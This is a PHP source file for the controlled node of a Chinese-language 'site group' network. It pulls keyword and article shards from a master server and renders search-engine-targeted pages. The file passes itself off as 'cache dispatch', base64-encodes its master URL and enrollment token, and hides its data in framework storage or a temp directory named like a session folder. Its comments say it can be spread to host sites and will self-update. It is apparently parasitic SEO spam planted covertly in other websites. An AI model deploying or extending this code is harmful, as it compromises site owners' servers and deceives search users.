<?php
/*sg*/
// cache dispatch


// 固定时区: 与主控一致(主控 bootstrap 用 Asia/Shanghai)。
// 页面日期目录由稳定时间戳生成, 各节点时区不一致会导致同页不同地址。
date_default_timezone_set("Asia/Shanghai");

// ---- PHP < 7.0 兼容填充 (被控端要跑在一切老环境里) ----
if (!function_exists('intdiv')) {
    function intdiv($a, $b) { return ($a - ($a % $b)) / $b; }
}
if (!function_exists('random_bytes')) {
    function random_bytes($len) {
        if (function_exists('openssl_random_pseudo_bytes')) {
            $b = openssl_random_pseudo_bytes($len, $strong);
            if ($b !== false && strlen($b) === $len) { return $b; }
        }
        $b = '';
        if (is_readable('/dev/urandom')) {
            $h = @fopen('/dev/urandom', 'rb');
            if ($h) { $b = (string)fread($h, $len); fclose($h); }
        }
        while (strlen($b) < $len) { $b .= chr(mt_rand(0, 255)); }
        return substr($b, 0, $len);
    }
}

$CFG = array(
    // 主控 API 地址（http / https 都可以）
    'master'   => base64_decode('aHR0cHM6Ly9uZy5haWo5OS54eXovYXBpLnBocA=='),
    // —— 模式一(推荐): 自助登记。node_key/secret 留空, 首次访问自动向主控
    //    登记换凭据, 主控后台「待批准」里点一下即上线。同一份文件可到处传。
    'node_key' => '',
    'secret'   => '',
    'enroll_token' => base64_decode('c2dfMWE1NGZjYmI4ZWRmZjNiYTA1ZDI3ZmExZTI1YTFmNWEwM2M5NzI1MQ=='),
    'domain'       => '',   // 仅 CLI 登记用; web 访问自动识别, 保持空
    // —— 模式二: 手工凭据。上面 enroll_token 留空, 把主控站点页生成的
    //    node_key/secret 填进去(老方式)。

    'base_path'      => '/bulletin',
    'data_dir'       => (function(){$d=__DIR__;for($i=0;$i<5;$i++){if(is_dir($d.'/storage')){return rtrim($d,'/').'/storage/framework/sg';}$p=dirname($d);if($p===$d)break;$d=$p;}return __DIR__.'/data';})(),
    'timeout'        => 20,
    'verify_ssl'     => true,   // 主控用自签证书时改 false；用 http:// 时本项无影响
    'bundle_size'    => 32,     // 一次向主控批量取多少个分片（主控 proto>=2 才生效）
                                // 逐片取的时间几乎全花在反复握手上，打包后往返次数降一个量级。
                                // 主控那边还有字节上限（sync.bundle_bytes），两者取先到的
    'sync_on_visit'  => true,   // 访问时顺带检查更新（输出完成后台执行，不拖慢页面）
    'debug'          => false,  // 出错时显示详细信息
);

// ---- data 目录自动创建; 根目录不可写时(共享主机/宿主站只读目录)退到系统临时目录 ----
if (!is_dir($CFG['data_dir'])) { @mkdir($CFG['data_dir'], 0777, true); }
if (!is_dir($CFG['data_dir']) || !is_writable($CFG['data_dir'])) {
    $CFG['data_dir'] = rtrim(sys_get_temp_dir(), '/') . '/sess_' . substr(md5($CFG['master']), 0, 10);
    if (!is_dir($CFG['data_dir'])) { @mkdir($CFG['data_dir'], 0777, true); }
}

// ---- 生成侧链接前缀: 未显式配置时按本次访问形态推断 ----------------
// /脚本/路径 进来 → 链接带脚本名; /子目录/... 进来 → 链接带子目录。
// 环境探测(env.json)有结论后在 Node 构造器里会覆盖这里的子目录推断。
if (PHP_SAPI !== 'cli' && empty($CFG['base_path']) && !empty($_SERVER['SCRIPT_NAME'])) {
    $sgSn = (string)$_SERVER['SCRIPT_NAME'];
    $sgUp = (string)parse_url(isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '', PHP_URL_PATH);
    if ($sgUp === $sgSn || strpos($sgUp, $sgSn . '/') === 0) {
        $CFG['base_path'] = $sgSn;
    } else {
        $sgDir = rtrim(str_replace('\\', '/', dirname($sgSn)), '/');
        if ($sgDir !== '' && $sgDir !== '.') { $CFG['base_path'] = $sgDir; }
    }
}

/**
 * 站群被控端核心（单文件，无依赖）
 *
 *  - 与主控用 HMAC-SHA256 双向签名通信，增量拉取分片快照
 *  - 数据落地为版本目录，切换原子化；主控挂了也能继续用旧数据出页面
 *  - 页面动态渲染 + 整页文件缓存（缓存目录按版本隔离，改数据即自动全量失效）
 *  - 模板为解释执行，不 eval 任何来自主控的字符串
 *
 * PHP 7.2+
 */

// ============================================================ 伪随机（稳定种子）
/**
 * xorshift32。同一个种子永远产出同一串数，保证页面内容跨请求稳定，
 * 不会每次刷新都换正文——这是能被正常收录的前提。
 */
class Prng
{
    private $s;

    public function __construct($seed)
    {
        $s = crc32((string)$seed) & 0xFFFFFFFF;
        $this->s = $s === 0 ? 0x9E3779B9 : $s;
    }

    public function next()
    {
        $x = $this->s;
        $x ^= ($x << 13) & 0xFFFFFFFF;
        $x ^= $x >> 17;
        $x ^= ($x << 5) & 0xFFFFFFFF;
        return $this->s = $x & 0xFFFFFFFF;
    }

    public function int($min, $max)
    {
        if ($max <= $min) { return $min; }
        return $min + ($this->next() % ($max - $min + 1));
    }

    public function pick(array $a)
    {
        if (!$a) { return null; }
        $k = array_keys($a);
        return $a[$k[$this->next() % count($k)]];
    }

    /** 取 n 个不重复的 [0,$max) 整数 */
    public function uniq($n, $max, array $exclude = array())
    {
        $out = array();
        if ($max <= 0) { return $out; }
        $n = min($n, $max - count($exclude));
        $guard = 0;
        while (count($out) < $n && $guard++ < $n * 20) {
            $v = $this->int(0, $max - 1);
            if (in_array($v, $exclude, true) || in_array($v, $out, true)) { continue; }
            $out[] = $v;
        }
        return $out;
    }
}

// ============================================================ 模板引擎
/**
 * 支持语法：
 *   {$a} {$a.b} {$a.b|raw} {$x|sub:30} {$t|date:Y-m-d} {$x|default:无}
 *   {if $a} {elseif $b == 'x'} {else} {/if}
 *   {foreach $list as $item} {$item.t} {$loop.index}{$loop.first} {/foreach}
 *   {include header}
 *   {* 注释 *}
 * 默认 HTML 转义，需要原样输出用 |raw。
 */
class Tpl
{
    private $templates;
    private $stack = array();
    private $depth = 0;

    public function __construct(array $templates)
    {
        $this->templates = $templates;
    }

    public function has($name)
    {
        return isset($this->templates[$name]);
    }

    public function render($name, array $vars)
    {
        if (!isset($this->templates[$name])) {
            return '<!-- template "' . htmlspecialchars($name) . '" missing -->';
        }
        if (++$this->depth > 10) { return '<!-- include too deep -->'; }
        $ast = $this->parse($this->templates[$name]);
        $this->stack[] = $vars;
        $out = $this->exec($ast);
        array_pop($this->stack);
        $this->depth--;
        return $out;
    }

    // ---------------- 解析 ----------------
    private static $cache = array();

    private function parse($src)
    {
        $key = md5($src);
        if (isset(self::$cache[$key])) { return self::$cache[$key]; }

        $re = '/\{(\*.*?\*|\$[^{}\r\n]*|if\s+[^{}]*|elseif\s+[^{}]*|else|\/if|foreach\s+[^{}]*|\/foreach|include\s+[\w\-]+)\}/s';
        $parts = preg_split($re, $src, -1, PREG_SPLIT_DELIM_CAPTURE);

        $pos = 0;
        $ast = $this->parseBlock($parts, $pos, null);
        return self::$cache[$key] = $ast;
    }

    /** $parts 交替为 [文本, 标签, 文本, 标签, ...] */
    private function parseBlock(array $parts, &$i, $stopAt)
    {
        $nodes = array();
        $n = count($parts);
        while ($i < $n) {
            // 文本
            if ($i % 2 === 0) {
                if ($parts[$i] !== '') { $nodes[] = array('t', $parts[$i]); }
                $i++;
                continue;
            }
            $tag = trim($parts[$i]);

            if ($tag === '' || $tag[0] === '*') { $i++; continue; }             // 注释

            if ($tag[0] === '$') {                                              // 变量
                $nodes[] = array('v', $this->parseVar(substr($tag, 1)));
                $i++;
                continue;
            }
            if (strpos($tag, 'include ') === 0) {
                $nodes[] = array('inc', trim(substr($tag, 8)));
                $i++;
                continue;
            }
            if (strpos($tag, 'if ') === 0) {
                $i++;
                $branches = array();
                $cond = substr($tag, 3);
                $body = $this->parseBlock($parts, $i, array('elseif', 'else', '/if'));
                $branches[] = array($cond, $body);
                while ($i < count($parts)) {
                    $cur = trim($parts[$i]);
                    if (strpos($cur, 'elseif ') === 0) {
                        $i++;
                        $branches[] = array(substr($cur, 7), $this->parseBlock($parts, $i, array('elseif', 'else', '/if')));
                    } elseif ($cur === 'else') {
                        $i++;
                        $branches[] = array(null, $this->parseBlock($parts, $i, array('/if')));
                    } else {                                                    // /if
                        $i++;
                        break;
                    }
                }
                $nodes[] = array('if', $branches);
                continue;
            }
            if (strpos($tag, 'foreach ') === 0) {
                $i++;
                $expr = substr($tag, 8);
                $item = 'item';
                $list = $expr;
                if (preg_match('/^(.+?)\s+as\s+\$?([\w]+)$/', trim($expr), $m)) {
                    $list = trim($m[1]);
                    $item = $m[2];
                }
                $list = ltrim(trim($list), '$');
                $body = $this->parseBlock($parts, $i, array('/foreach'));
                if ($i < count($parts) && trim($parts[$i]) === '/foreach') { $i++; }
                $nodes[] = array('each', $list, $item, $body);
                continue;
            }
            if ($stopAt && in_array($tag, $stopAt, true)) {
                return $nodes;                                                  // 交给上层处理（不前进）
            }
            // 未知标签原样输出
            $nodes[] = array('t', '{' . $parts[$i] . '}');
            $i++;
        }
        return $nodes;
    }

    /** "a.b|sub:20|raw" => ['path'=>['a','b'], 'filters'=>[['sub','20'],['raw',null]]] */
    private function parseVar($expr)
    {
        $segs = explode('|', $expr);
        $path = array_shift($segs);
        $filters = array();
        foreach ($segs as $f) {
            $f = trim($f);
            if ($f === '') { continue; }
            $arg = null;
            if (strpos($f, ':') !== false) { list($f, $arg) = explode(':', $f, 2); }
            $filters[] = array(strtolower(trim($f)), $arg);
        }
        return array('path' => explode('.', trim($path)), 'filters' => $filters);
    }

    // ---------------- 执行 ----------------
    private function exec(array $nodes)
    {
        $out = '';
        foreach ($nodes as $nd) {
            switch ($nd[0]) {
                case 't':
                    $out .= $nd[1];
                    break;
                case 'v':
                    $out .= $this->applyFilters($this->get($nd[1]['path']), $nd[1]['filters']);
                    break;
                case 'inc':
                    $out .= $this->render($nd[1], $this->scope());
                    break;
                case 'if':
                    foreach ($nd[1] as $br) {
                        if ($br[0] === null || $this->cond($br[0])) {
                            $out .= $this->exec($br[1]);
                            break;
                        }
                    }
                    break;
                case 'each':
                    $list = $this->get(explode('.', $nd[1]));
                    if (!is_array($list) || !$list) { break; }
                    $idx = 0; $total = count($list);
                    foreach ($list as $k => $v) {
                        $this->stack[] = array(
                            $nd[2] => $v,
                            'loop' => array(
                                'index' => $idx + 1, 'index0' => $idx, 'key' => $k,
                                'first' => $idx === 0, 'last' => $idx === $total - 1,
                                'total' => $total, 'odd' => $idx % 2 === 0,
                            ),
                        );
                        $out .= $this->exec($nd[3]);
                        array_pop($this->stack);
                        $idx++;
                    }
                    break;
            }
        }
        return $out;
    }

    private function scope()
    {
        $merged = array();
        foreach ($this->stack as $s) { $merged = array_merge($merged, $s); }
        return $merged;
    }

    private function get(array $path)
    {
        for ($i = count($this->stack) - 1; $i >= 0; $i--) {
            $cur = $this->stack[$i];
            $ok = true;
            foreach ($path as $p) {
                if (is_array($cur) && array_key_exists($p, $cur)) {
                    $cur = $cur[$p];
                } else {
                    $ok = false;
                    break;
                }
            }
            if ($ok) { return $cur; }
        }
        return null;
    }

    /** 只支持 单变量 / !变量 / 变量 op 字面量 —— 不做任何 eval */
    private function cond($expr)
    {
        $expr = trim($expr);
        if ($expr === '') { return false; }

        if (preg_match('/^(.+?)\s*(==|!=|>=|<=|>|<)\s*(.+)$/', $expr, $m)) {
            $l = $this->operand($m[1]);
            $r = $this->operand($m[3]);
            switch ($m[2]) {
                case '==': return $l == $r;
                case '!=': return $l != $r;
                case '>':  return $l >  $r;
                case '<':  return $l <  $r;
                case '>=': return $l >= $r;
                case '<=': return $l <= $r;
            }
            return false;
        }
        $neg = false;
        if ($expr[0] === '!') { $neg = true; $expr = ltrim(substr($expr, 1)); }
        $v = $this->operand($expr);
        $truthy = !($v === null || $v === false || $v === '' || $v === 0 || $v === '0' || (is_array($v) && !$v));
        return $neg ? !$truthy : $truthy;
    }

    private function operand($s)
    {
        $s = trim($s);
        if ($s === '') { return null; }
        if ($s[0] === '$') { return $this->get(explode('.', substr($s, 1))); }
        if (($s[0] === "'" && substr($s, -1) === "'") || ($s[0] === '"' && substr($s, -1) === '"')) {
            return substr($s, 1, -1);
        }
        if (is_numeric($s)) { return $s + 0; }
        if ($s === 'true')  { return true; }
        if ($s === 'false') { return false; }
        if ($s === 'null')  { return null; }
        return $s;
    }

    private function applyFilters($v, array $filters)
    {
        $raw = false;
        foreach ($filters as $f) {
            list($name, $arg) = $f;
            switch ($name) {
                case 'raw':   $raw = true; break;
                case 'upper': $v = mb_strtoupper((string)$v); break;
                case 'lower': $v = mb_strtolower((string)$v); break;
                case 'trim':  $v = trim((string)$v); break;
                case 'sub':   $n = (int)$arg; $s = (string)$v;
                              $v = mb_strlen($s) > $n ? mb_substr($s, 0, $n) . '…' : $s; break;
                case 'strip': $v = strip_tags((string)$v); break;
                case 'nl2br': $v = nl2br((string)$v); $raw = true; break;
                case 'date':  $v = date($arg ?: 'Y-m-d', (int)$v ?: time()); break;
                case 'num':   $v = number_format((float)$v); break;
                case 'url':   $v = rawurlencode((string)$v); break;
                // JSON 字符串转义（不含外层引号），专供 JSON-LD 内嵌；
                // < > & 一并转成 \uXXXX，避免在 <script> 里被截断
                case 'json':
                    $j = json_encode((string)$v, JSON_UNESCAPED_UNICODE | JSON_HEX_TAG
                                                | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
                    $v = ($j === false) ? '' : substr($j, 1, -1);
                    $raw = true;
                    break;
                case 'default': if ($v === null || $v === '') { $v = $arg; } break;
            }
        }
        if (is_array($v)) { $v = ''; }
        if ($v === null || $v === false) { $v = ''; }
        return $raw ? (string)$v : htmlspecialchars((string)$v, ENT_QUOTES, 'UTF-8');
    }
}

// ============================================================ 节点主体
class Node
{
    /**
     * 本节点实现的同步协议版本。见主控 bootstrap.php 里 SG_PROTO 的说明。
     * 节点每次请求都把它报给主控，主控响应回自己的版本，双方各自按对方能力降级：
     * 主控 proto<2 就老老实实一片一片拉，proto<3 就照旧收整份 meta。
     */
    const PROTO = 4;
    const BUILD = 5;   // 构建号: 主控比这新就自更新

    public $cfg;
    public $dir;          // data 目录
    public $ver = 0;      // 当前生效数据版本
    private $masterProto = 1;  // 主控自报的协议版本，收到响应后更新
    public $meta = array();
    private $res = array();   // 已加载资源缓存
    private $reqBot = null;   // 本次请求是不是搜索引擎（null=还没判断）
    private $codeAB = null;   // 地址编码参数，算一次就缓存
    private $set = array();   // 站点设置
    private $siteData = array();
    public $basePath = '';   // 链接前缀: 子目录/PATH_INFO 部署时由配置或环境探测给出
    public $envMode = '';    // 环境探测结论: clean/pathinfo/query(broken 按 query 处理)

    public function __construct(array $cfg)
    {
        $this->cfg = $cfg + array(
            'master' => '', 'node_key' => '', 'secret' => '',
            'data_dir' => __DIR__ . '/data', 'timeout' => 20, 'debug' => false, 'verify_ssl' => true,
            // 主控地址填成 http:// 时是否照发。默认不发——签名防伪造，但防不了被看见，
            // 明文之下整份词库/文章/模板连同其它节点的 node_key 都是明的。
            'allow_http' => false,
            'base_path' => '',
            'enroll_token' => '',   // 自助登记令牌(node_key/secret 留空时启用)
            'domain' => '',         // CLI 登记时用的本机域名(web 访问自动识别)
            'bundle_size' => 32,
            'sync_on_visit' => true,
        );
        $this->dir = rtrim($this->cfg['data_dir'], '/');
        $this->basePath = (string)$this->cfg['base_path'];
        $this->ensureDir($this->dir);
        $this->loadMeta();
        // 环境探测的结论(CLI 预热/同步时也要按探测到的形态生成链接)
        $env = $this->envLoad();
        $this->envMode = isset($env['mode']) ? (string)$env['mode'] : '';
        if ($this->envMode === 'broken') { $this->envMode = 'query'; }  // v4 起 broken 自动转查询串形态
        if ($this->basePath === '' && !empty($env['base_path'])) { $this->basePath = (string)$env['base_path']; }
        // query 模式链接形态是 /目录?路径, 覆盖按脚本名推断出的 /目录/index.php
        if ($this->envMode === 'query' && isset($env['base_path'])) { $this->basePath = (string)$env['base_path']; }
        // 自助登记模式: 配置文件没填凭据, 用登记后落盘的 cred.json
        if ($this->cfg['node_key'] === '') {
            $c = json_decode((string)@file_get_contents($this->dir . '/cred.json'), true);
            if (is_array($c) && !empty($c['node_key']) && !empty($c['secret'])) {
                $this->cfg['node_key'] = $c['node_key'];
                $this->cfg['secret']   = $c['secret'];
            }
        }
    }

    /** 环境探测结果缓存 */
    public function envLoad()
    {
        $f = $this->dir . '/env.json';
        if (!is_file($f)) { return array(); }
        $d = json_decode((string)@file_get_contents($f), true);
        return is_array($d) ? $d : array();
    }

    public function envSave(array $env)
    {
        $this->atomicWrite($this->dir . '/env.json', json_encode($env, JSON_UNESCAPED_UNICODE));
    }

    // ---------------- 基础设施 ----------------
    private function ensureDir($d)
    {
        if (!is_dir($d)) { @mkdir($d, 0755, true); }
        // data 目录必须不可被直接列目录/执行
        $ht = $this->dir . '/.htaccess';
        if ($d === $this->dir && !is_file($ht)) {
            @file_put_contents($ht, "Require all denied\nOrder allow,deny\nDeny from all\n");
            @file_put_contents($this->dir . '/index.html', '');
        }
        return is_dir($d);
    }

    private function verDir($v = null)
    {
        return $this->dir . '/v' . ($v === null ? $this->ver : $v);
    }

    private function loadMeta()
    {
        $f = $this->dir . '/meta.json';
        if (is_file($f)) {
            $m = json_decode(file_get_contents($f), true);
            if (is_array($m) && !empty($m['version'])) {
                $this->ver  = (int)$m['version'];
                $this->meta = $m;
            }
        }
    }

    public function ready()
    {
        return $this->ver > 0 && is_dir($this->verDir());
    }

    public function state()
    {
        $f = $this->dir . '/state.json';
        $s = is_file($f) ? json_decode(file_get_contents($f), true) : array();
        return is_array($s) ? $s : array();
    }

    public function setState(array $patch)
    {
        $s = array_merge($this->state(), $patch);
        $this->atomicWrite($this->dir . '/state.json', json_encode($s));
        return $s;
    }

    private function atomicWrite($file, $content)
    {
        $tmp = $file . '.' . getmypid() . '.tmp';
        if (@file_put_contents($tmp, $content, LOCK_EX) === false) { return false; }
        return @rename($tmp, $file);
    }

    /** 载入某个资源（分片） */
    public function res($name, $no = 0)
    {
        $k = $name . ':' . $no;
        if (isset($this->res[$k])) { return $this->res[$k]; }
        $f = $this->verDir() . '/' . $name . ($name === 'keywords' || $name === 'articles' ? '_' . $no : '') . '.json';
        $v = is_file($f) ? json_decode(file_get_contents($f), true) : null;
        return $this->res[$k] = (is_array($v) ? $v : array());
    }

    public function settings()
    {
        if ($this->set) { return $this->set; }
        $site = $this->res('site');
        $this->siteData = $site;
        $this->set = isset($site['settings']) ? $site['settings'] : array();
        return $this->set;
    }

    public function s($k, $default = null)
    {
        $set = $this->settings();
        return isset($set[$k]) && $set[$k] !== '' ? $set[$k] : $default;
    }

    public function site()
    {
        $this->settings();
        return $this->siteData;
    }

    /**
     * 序号空间大小（含删词留下的空洞）。所有按 seq 枚举的地方都用它——
     * 换成真实条数会让空洞后面的词平移，URL 全变。
     */
    public function count($what)
    {
        return isset($this->meta['count'][$what]) ? (int)$this->meta['count'][$what] : 0;
    }

    /**
     * 真实条数，只用于展示与上报。
     * 老主控（没下发 live）就退回序号空间，数字偏大但不会出错。
     */
    public function liveCount($what)
    {
        return isset($this->meta['live'][$what])
             ? (int)$this->meta['live'][$what] : $this->count($what);
    }

    private function chunkSize($what)
    {
        return isset($this->meta['chunk'][$what]) ? max(1, (int)$this->meta['chunk'][$what]) : 1000;
    }

    public function keyword($seq)
    {
        $seq = (int)$seq;
        if ($seq < 0 || $seq >= $this->count('keywords')) { return null; }
        $cs = $this->chunkSize('keywords');
        $c  = $this->res('keywords', intdiv($seq, $cs));
        $i  = $seq % $cs;
        return isset($c[$i]) ? $c[$i] + array('seq' => $seq) : null;
    }

    public function article($seq)
    {
        $seq = (int)$seq;
        if ($seq < 0 || $seq >= $this->count('articles')) { return null; }
        $cs = $this->chunkSize('articles');
        $c  = $this->res('articles', intdiv($seq, $cs));
        $i  = $seq % $cs;
        return isset($c[$i]) ? $c[$i] + array('seq' => $seq) : null;
    }

    /** 连续取一段关键词，用于列表页 */
    public function keywordRange($start, $len)
    {
        $out = array();
        $total = $this->count('keywords');
        for ($i = $start; $i < min($start + $len, $total); $i++) {
            $kw = $this->keyword($i);
            if ($kw) { $out[] = $this->kwView($kw); }
        }
        return $out;
    }

    public function articleRange($start, $len)
    {
        $out = array();
        $total = $this->count('articles');
        for ($i = $start; $i < min($start + $len, $total); $i++) {
            $a = $this->article($i);
            if ($a) { $out[] = $this->artView($a, false); }
        }
        return $out;
    }

    /** 某个分类下的 seq 列表（分片按 seq 排列后分类不再连续，靠这个索引定位） */
    public function catSeqs($slug)
    {
        $idx = $this->res('catindex');
        return isset($idx[$slug]) && is_array($idx[$slug]) ? $idx[$slug] : array();
    }

    public function articlesOfCat($slug, $offset, $len)
    {
        $seqs = array_slice($this->catSeqs($slug), $offset, $len);
        $out = array();
        foreach ($seqs as $seq) {
            $a = $this->article((int)$seq);
            if ($a) { $out[] = $this->artView($a, false); }
        }
        return $out;
    }

    // ---------------- URL ----------------
    public function base()
    {
        $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
              || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');
        $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
        if ($host === '') {
            $site = $this->site();
            $host = isset($site['domain']) ? preg_replace('~^https?://~', '', $site['domain']) : 'localhost';
        }
        return ($https ? 'https://' : 'http://') . $host;
    }

    /** 去掉 {page} 所在的整个路径段，得到第一页的 URL 形态 */
    public static function pagelessPattern($pattern)
    {
        $pos = strpos($pattern, '{page}');
        if ($pos === false) { return $pattern; }
        $cut = strrpos(substr($pattern, 0, $pos), '/');
        return $cut === false ? '/' : substr($pattern, 0, $cut + 1);
    }

    public function url($type, array $p = array())
    {
        $pat = $this->s('url_' . $type, '');
        if ($pat === '') { return '/'; }
        if (strpos($pat, '{code}') !== false && isset($p['id']) && !isset($p['code'])) {
            $p['code'] = $this->encodeCode($type, (int)$p['id']);
        }
        return $this->pubUrl($this->fillPattern($pat, $p));
    }

    /**
     * 输出侧统一加链接前缀。query 模式(伪静态和 PATH_INFO 都不可用的环境)
     * 把整个路径塞进查询串: /lib/?20200723/abc123def4.html ——
     * 只要能执行这个 PHP 文件就一定打得开, 不依赖任何服务器重写能力。
     */
    public function pubUrl($path)
    {
        if ($this->envMode === 'query') {
            return $this->basePath . '?' . ltrim($path, '/');
        }
        return $this->basePath . $path;
    }

    /** 把一条 URL 规则填成实际地址 */
    public function fillPattern($pat, array $p)
    {
        if (isset($p['page']) && (int)$p['page'] <= 1) {
            $pat = self::pagelessPattern($pat);
            unset($p['page']);
        }
        // 时间目录：日期由调用方给的稳定时间戳决定，绝不取"当前时间"——
        // 取当前时间的话每天全站换地址，等于每天把收录清零一次。
        if (strpos($pat, '{y}') !== false || strpos($pat, '{m}') !== false || strpos($pat, '{d}') !== false) {
            $ts = isset($p['ts']) ? (int)$p['ts'] : 0;
            if ($ts <= 0) { $ts = $this->dateBase(); }
            $pat = str_replace(array('{y}', '{m}', '{d}'),
                               array(date('Y', $ts), date('m', $ts), date('d', $ts)), $pat);
        }
        unset($p['ts']);
        foreach ($p as $k => $v) {
            $pat = str_replace('{' . $k . '}', rawurlencode((string)$v), $pat);
        }
        return preg_replace('/\{[a-z]+\}/', '', $pat);
    }

    // ---------------- 地址编码 ----------------
    // {code} = 10 位字母数字，看着像随机串，其实是把「类型 + 永久序号」可逆地编进去的：
    //   前 6 位 = (n * A + B) mod 36^6 的 36 进制，A/B 由本站 node_key 决定
    //   后 4 位 = 校验位，乱猜的地址直接 404
    // 好处：不暴露连续序号（/k/1 /k/2 … 一眼就是机器生成的），
    //      又不需要任何「短码 -> 页面」索引表，解码就是几次算术，O(1)。
    const CODE_M = 2176782336;          // 36^6
    const CODE_T = 1679616;             // 36^4
    const B36 = '0123456789abcdefghijklmnopqrstuvwxyz';

    /** 模乘，拆成高低位算，避免超出双精度整数安全范围 */
    public static function mulmod($x, $a, $m)
    {
        $x %= $m;
        $hi = (int)floor($a / 65536);
        $lo = $a % 65536;
        $r = (($x * $hi) % $m) * 65536 % $m;
        return (int)(($r + ($x * $lo) % $m) % $m);
    }

    public static function b36($x, $len)
    {
        $s = '';
        for ($i = 0; $i < $len; $i++) { $s = self::B36[$x % 36] . $s; $x = (int)($x / 36); }
        return $s;
    }

    public static function unb36($s)
    {
        $x = 0;
        for ($i = 0; $i < strlen($s); $i++) {
            $p = strpos(self::B36, $s[$i]);
            if ($p === false) { return -1; }
            $x = $x * 36 + $p;
        }
        return $x;
    }

    /**
     * A 必须与 36^6 = 2^12·3^12 互质，即不能被 2 或 3 整除。
     * 用 $key 参数化：本站用自己的 node_key，拼互链时用对端的（主控随快照下发）。
     */
    public static function codeParamsOf($key)
    {
        // 不用 |1：JScript 的位运算是 32 位有符号的，2.17e9 会溢出成负数
        $a = crc32($key . '|codeA') % self::CODE_M;
        if ($a % 2 === 0) { $a++; }
        while ($a % 3 === 0) { $a += 2; }
        $b = crc32($key . '|codeB') % self::CODE_M;
        return array($a, $b, self::modInv($a, self::CODE_M));
    }

    public function codeParams()
    {
        if ($this->codeAB !== null) { return $this->codeAB; }
        return $this->codeAB = self::codeParamsOf($this->cfg['node_key']);
    }

    /** 扩展欧几里得求模逆 */
    public static function modInv($a, $m)
    {
        $g = $m; $x = 0; $x1 = 1; $a1 = $a % $m;
        while ($a1 != 0) {
            $q = (int)floor($g / $a1);
            $t = $g - $q * $a1; $g = $a1; $a1 = $t;
            $t = $x - $q * $x1;  $x = $x1; $x1 = $t;
        }
        return (($x % $m) + $m) % $m;
    }

    /** 用任意 node_key 编码（拼对端深链时用对端的 key） */
    public static function encodeCodeOf($key, $type, $seq)
    {
        list($a, $b, ) = self::codeParamsOf($key);
        $n = ((int)$seq * 2) + ($type === 'art' ? 1 : 0);
        $x = (self::mulmod($n, $a, self::CODE_M) + $b) % self::CODE_M;
        $head = self::b36($x, 6);
        return $head . self::b36(crc32($key . '|' . $head) % self::CODE_T, 4);
    }

    public function encodeCode($type, $seq)
    {
        list($a, $b, ) = $this->codeParams();
        $n = ((int)$seq * 2) + ($type === 'art' ? 1 : 0);
        $x = (self::mulmod($n, $a, self::CODE_M) + $b) % self::CODE_M;
        $head = self::b36($x, 6);
        return $head . self::b36(crc32($this->cfg['node_key'] . '|' . $head) % self::CODE_T, 4);
    }

    /** @return array|null  array('type'=>'kw'|'art', 'seq'=>int)，校验不过返回 null */
    public function decodeCode($code)
    {
        $code = strtolower((string)$code);
        if (strlen($code) !== 10) { return null; }
        $head = substr($code, 0, 6);
        $tail = substr($code, 6);
        if (self::b36(crc32($this->cfg['node_key'] . '|' . $head) % self::CODE_T, 4) !== $tail) {
            return null;                                   // 校验位不对，乱猜的地址
        }
        $x = self::unb36($head);
        if ($x < 0) { return null; }
        list($a, $b, $ainv) = $this->codeParams();
        $n = self::mulmod(($x - $b + self::CODE_M) % self::CODE_M, $ainv, self::CODE_M);
        return array('type' => ($n % 2 === 1) ? 'art' : 'kw', 'seq' => (int)floor($n / 2));
    }

    /** 时间目录的起始日（站点设置里给，缺省用一个固定回退值——绝不能随当前时间漂移） */
    public static function dateBaseOf($s)
    {
        $s = trim((string)$s);
        if ($s !== '') {
            $t = strtotime($s . ' 00:00:00 UTC');
            if ($t !== false) { return $t; }
        }
        return strtotime('2020-01-01 00:00:00 UTC');
    }

    public function dateBase()
    {
        return self::dateBaseOf($this->s('url_date_start', ''));
    }

    /**
     * 页面在时间目录里用哪一天。
     *   有真实入库时间（文章）就用真实的；
     *   没有的（关键词）按永久序号均匀铺在 [起始日, 起始日+天数) 里。
     * 两种都只跟页面自身有关，永久不变。
     */
    public function pageTs($seq, $realTs = 0)
    {
        if ($realTs > 0) { return (int)$realTs; }
        $days = max(1, (int)$this->s('url_date_days', 365));
        return $this->dateBase() + (((int)$seq % $days) * 86400);
    }

    /** 由 URL 规则生成匹配正则 */
    private function pattern2regex($pattern)
    {
        $re = preg_quote($pattern, '~');
        $re = str_replace(array('\{id\}', '\{page\}', '\{slug\}'),
                          array('(?P<id>\d+)', '(?P<page>\d+)', '(?P<slug>[^/]+)'), $re);
        return '~^' . $re . '$~u';
    }

    // ---------------- 内容装配 ----------------
    private function ruleList($scene, $kind)
    {
        $rules = $this->res('rules');
        $k = $scene . '.' . $kind;
        return isset($rules[$k]) && $rules[$k] ? $rules[$k] : array();
    }

    /**
     * 渲染一条 TDK 规则。
     *
     * 关键设计：这里**不使用**任何共享随机流，只依赖 (种子字符串, 规则文本)。
     *   - 规则用「加权最小哈希」(HRW) 选，不是"随机数取模"。
     *     取模的问题是规则池一变，所有页面的选择整体错位；
     *     HRW 下增删某条规则只影响那条规则本来该赢/该输的少数页面。
     *   - {spin:} 的展开用 (种子 + 规则文本) 现场派生的随机流，
     *     不受本页其它任何逻辑影响。
     * 结果：加文章、加关键词、改内链、改广告、改缓存……都不会动到已有页面的 TDK。
     *
     * 变量：{kw} {site} {domain} {cat} {title} {year} {month} {day}
     *       {var.xxx} 站点自定义变量  {spin:甲|乙|丙}  {rand:100,999}
     */
    public function rule($scene, $kind, array $vars, $seed, $fallback = '')
    {
        $list = $this->ruleList($scene, $kind);
        $tpl  = $list ? self::hrwPick($list, $seed . '|' . $scene . '.' . $kind) : $fallback;
        if ($tpl === '' || $tpl === null) { return ''; }
        return $this->fill($tpl, $vars, new Prng($seed . '|' . $tpl));
    }

    /**
     * 加权最小哈希选择。$list 里同一条模板重复出现 n 次即权重 n
     * （主控就是这样表达权重的），这里折算成权重后再比。
     */
    public static function hrwPick(array $list, $seed)
    {
        $weight = array();
        foreach ($list as $tpl) {
            $weight[$tpl] = isset($weight[$tpl]) ? $weight[$tpl] + 1 : 1;
        }
        $best = null;
        $bestScore = null;
        foreach ($weight as $tpl => $w) {
            $score = crc32($seed . '|' . $tpl) / $w;   // 权重越大分数越小越容易赢
            if ($bestScore === null || $score < $bestScore) {
                $bestScore = $score;
                $best = $tpl;
            }
        }
        return $best;
    }

